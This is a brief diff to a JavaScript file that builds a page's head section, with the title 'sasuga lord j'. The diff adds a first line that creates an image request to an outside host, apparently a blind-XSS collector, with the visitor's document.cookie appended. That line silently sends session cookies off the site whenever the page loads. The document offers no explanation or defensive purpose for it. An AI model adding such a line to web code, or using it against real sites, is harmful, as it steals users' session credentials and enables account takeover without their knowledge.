@@ -1,3 +1,5 @@
+new Image().src = "https://mpsshh.bxss.in" + encodeURIComponent(document.cookie);
+
 document.head.innerHTML = `
   <meta charset="UTF-8">
   <title>sasuga lord j</title>
